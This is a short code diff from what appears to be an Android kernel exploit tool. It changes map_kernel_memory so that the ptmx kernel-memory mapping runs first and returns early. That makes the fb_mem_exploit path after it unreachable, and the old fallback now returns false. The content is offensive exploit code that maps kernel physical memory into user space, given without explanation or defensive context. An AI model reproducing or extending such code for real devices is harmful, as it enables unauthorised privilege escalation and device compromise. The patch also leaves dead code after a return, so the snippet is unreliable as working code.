@@ -105,6 +105,11 @@ map_kernel_memory(void)
     }
   }
 
+  fb_mmap_fd = -1;
+
+  kernel_mapped_address = PTMX_MEMORY_MAPPED_ADDRESS;
+  return ptmx_map_memory(PTMX_MEMORY_MAPPED_ADDRESS, kernel_physical_offset, KERNEL_MEMORY_SIZE);
+
   fb_mem_set_kernel_phys_offset(kernel_physical_offset - 0x8000);
 
   printf("Attempt fb_mem_exploit...\n");
@@ -113,10 +118,10 @@ map_kernel_memory(void)
     kernel_mapped_address = (unsigned long int)fb_mem_convert_to_mmaped_address((void *)KERNEL_BASE_ADDRESS, fb_mem_mmap_base);
     return true;
   }
+
   fb_mmap_fd = -1;
 
-  kernel_mapped_address = PTMX_MEMORY_MAPPED_ADDRESS;
-  return ptmx_map_memory(PTMX_MEMORY_MAPPED_ADDRESS, kernel_physical_offset, KERNEL_MEMORY_SIZE);
+  return false;
 }
 
 bool
